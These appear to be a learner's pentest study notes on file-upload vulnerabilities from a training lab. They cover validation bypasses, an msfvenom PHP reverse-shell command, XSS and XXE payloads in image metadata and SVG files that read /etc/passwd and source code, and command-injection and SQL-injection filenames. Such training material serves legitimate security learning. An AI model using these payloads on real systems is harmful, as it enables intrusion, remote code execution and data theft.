## Absent Validation

### Identifying Web Framework

First you must identify what language runs the web application since a web shell has to be written in the same programming language that runs the web server.

Things to inspect:
- URL extensions
- Certain web frameworks use `Web Routes` to map URLs to web pages
- Visit the `/index.ext` page and replace `ext` with various common extensions (e.g., `php`, `asp`, `aspx`)
	- Can use `/usr/share/SecLists/Discovery/Web-Content/web-extensions.txt`
- [Wappalyzer](https://www.wappalyzer.com/)

### Vulnerability Identification

#### Upload a basic `Hello World` script to the site
```Shell
echo '<?php echo "Hello World";?>' > test.php
```
If the page could not run PHP code, we would see our source code printed on the page

#### Basic PHP File Read

See folder in Kali

#### Basic PHP Command Execution

See folder in Kali


## Upload Exploitation

### Web Shells

- phpbash
- `/usr/share/SecLists/Web-Shells`
- Custom shell in Kali folder (PHP and ASP)

#### Reverse Shells
- PHP: PentestMonkey
- `/usr/share/SecLists/Web-Shells`

Input our `IP` and listening `PORT`
Start a netcat listener

#### Custom Reverse Shell
```Shell
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```
Start a netcat listener to catch it once executed


## Client-Side Validation

If the page never refreshes or sends any HTTP requests after selecting our file, it may be doing all validation on the front-end.

Options:
- Modify the upload request to the back-end server
- Manipulate the front-end code to disable these type validations

### Back-end Request Modification
![[Pasted image 20230203104829.png]]

#### Change `HTB.png` to `shell.php` and add webshell payload
![[Pasted image 20230203105019.png]]
If successfully uploaded, you can visit the uploaded file and interact with it and gain remote code execution

*Note: We may also modify the Content-Type of the uploaded file, though this should not play an important role at this stage, so we'll keep it unmodified.*

### Disabling Front-end Validation

#### Navigate to the browser's Page Inspector and click on the profile image, which is where we trigger the file selector for the upload form
![[Pasted image 20230203105320.png]]

#### This will highlight the following HTML file input on line 18
```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

#### Modify this and select `All Files`

#### Go to `onchange="checkFile(this)"` and go to the browser's `Console`, then type the function's name `(checkFile`) to get its details
```JavaScript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```
Add PHP as one of the allowed extensions or modify the function to remove the extension check

*Note: The modification we made to the source code is temporary and will not persist through page refreshes, as we are only changing it on the client-side. However, our only need is to bypass the client-side validation, so it should be enough for this purpose.*

#### Once we upload our web shell using either of the above methods and then refresh the page, we can use the Page Inspector once more with [CTRL+SHIFT+C], click on the profile image, and we should see the URL of our uploaded web shell
```html
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

***LAB Notes:*

Changed the following in the code:
```html
onsubmit="if(validate()){upload()}"
```
to
```html
onsubmit="upload()"
```


## Blacklist Filters

### Blacklisting Extensions
There are generally two common forms of validating a file extension on the back-end:

1. Testing against a blacklist of types
2. Testing against a whitelist of types

e.g.,
```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

*Tip: The comparison above is also case-sensitive, and is only considering lowercase extensions. In Windows Servers, file names are case insensitive, so we may try uploading a php with a mixed-case (e.g. pHp), which may bypass the blacklist as well, and should still execute as a PHP script.*

### Fuzzing Extensions

Wordlists: 
- `/usr/share/SecLists/Web-Content/web-extensions.txt`
- PayLoadsAllTheThings for [PHP](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload Insecure Files/Extension PHP/extensions.lst) and [.NET](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)

#### Send the request to Intruder in Burp
From the Positions tab, we can `Clear` any automatically set positions, and then select the `.php` extension in `filename="HTB.php"` and click the `Add` button to add it as a fuzzing position
![[Pasted image 20230203120227.png]]

- Load the PHP extensions list from above in the `Payloads` tab under `Payload Options`
- Un-tick the `URL Encoding` option to avoid encoding the (`.`) before the file extension
- Click on Start Attack to start fuzzing for file extensions that are not blacklisted
![[Pasted image 20230203120356.png]]
We can sort the results by Length, and we will see that all requests with the Content-Length (193) passed the extension validation, as they all responded with File successfully uploaded. In contrast, the rest responded with an error message saying Extension not allowed.

### Non-Blacklisted Extensions
*Not all extensions will work with all web server configurations, so we may need to try several extensions to get one that successfully executes PHP code.*

- Right-click on a request in the Intruder results and select `Send to Repeater`
- Change the file name to use the `.phtml` extension
![[Pasted image 20230203120624.png]]


## Whitelist Filters

#### Fuzz for allowed extensions using wordlist from Blacklist Filters section (`/usr/share/SecLists/Web-Content/web-extensions.txt`)
![[Pasted image 20230205100727.png]]

### Double Extensions

If the `.jpg` extension was allowed, we can add it in our uploaded file name and still end our filename with `.php` (e.g. `shell.jpg.php`)

#### Intercept a normal upload request, and modify the file name to (`shell.jpg.php`), and modify its content to that of a web shell
![[Pasted image 20230205101115.png]]
This may not always work, as some web applications may use a strict regex pattern

### Reverse Double Extension
![[Pasted image 20230205101648.png]]

### Character Injection

Some characters that can be injected:
- %20
- %0a
- %00
- %0d0a
- /
- .\
- .
- …
- :

#### Character Injection Bash Script
```Shell
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```
Use in Burp to fuzz for allowable extensions

***LAB notes:*
Extension that worked was: `.phar.jpg` (Reverse Double Extension)
```url
http://142.93.38.9:30999/profile_images/shell.phar.jpg?cmd=id
```

## Type Filters

If you've tried previous methods and the file extension does not affect the error message, the web application must be testing the file content for type validation.

Two common methods for validating the file content: 
- `Content-Type Header`
- `File Content`

### Content-Type

#### Fuzzing the Content-Type header with SecLists' `Content-Type` Wordlist (`/usr/share/SecLists/Miscellaneous/web/content-type.txt`)
```Shell
cat content-type.txt | grep 'image/' > image-content-types.txt
```

#### Intercept the payload request and use Burp Intruder to fuzz the `Content-Type` header:
![[Pasted image 20230206095755.png]]
*Note: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.*

### MIME-Type
If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.

*Tip: Many other image types have non-printable bytes for their file signatures, while a GIF image starts with ASCII printable bytes (as shown above), so it is the easiest to imitate. Furthermore, as the string GIF8 is common between both GIF signatures, it is usually enough to imitate a GIF image.*
	`GIF87a` or `GIF89a`

#### Add `GIF8` before PHP code in Burp to imitate a GIF image
![[Pasted image 20230206110112.png]]
Keep file extension as PHP

#### Visit webpage
![[Pasted image 20230206110203.png]]
*Note: We see that the command output starts with GIF8 , as this was the first line in our PHP script to imitate the GIF magic bytes, and is now outputted as a plaintext before our PHP code is executed.*

***LAB Notes:*
- Used double extensions w/ GIF8
```url
http://68.183.45.43:30516/profile_images/shell.jpg.phar?cmd=id
```


## Limited File Uploads

### XSS
Can be used when a web application allows us to upload `HTML` files

#### Including an XSS payload in one of the Metadata parameters that accept raw text, like the `Comment` or `Artist` parameters
```Shell
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
```

```Shell
exiftool HTB.jpg

...SNIP...
Comment                         :  "><img src=1 onerror=alert(window.origin)>
```
We can see that the `Comment` parameter was updated to our XSS payload. When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. If we change the image's MIME-Type to text/html, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.

#### Modifying XML data of SVG images to include an XSS payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert("window.origin");</script>
</svg>
```
Written to `HTB.svg` in a file, which you upload. Once we upload the image to the web application, the XSS payload will be triggered whenever the image is displayed.

### XXE

#### SVG image that leaks the content of (`/etc/passwd`)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```
Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (`/etc/passwd`) printed on the page or shown in the page source

#### XXE to read source code in PHP web applications
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```
Once the SVG image is displayed, we should get the base64 encoded content of` index.php`, which we can decode to read the source code.

*Note: XML data can be used by other types of documents, like PDF, Word Documents, and PowerPoint Documents*

***LAB Notes:*

Found flag using the `XXE.svg` payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<svg>&xxe;</svg>
```
Was displayed in the inspector field

For second question used:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```

Found base64 encoded file contents in inspector field
Decoded and found `./images/` filepath

## Other Upload Attacks

### Injections in File Name
Uses a malicious string for the uploaded file name, which may get executed or processed if the uploaded file name is displayed (i.e., reflected) on the page.

e.g.,
Naming a file `file$(whoami).jpg` or `file``whoami``.jpg `or ``file||whoami``
or
XSS payload in the file name: `<script>alert(window.origin);</script>`
or
SQLi in the file name: `file';select+sleep(5);--.jpg`


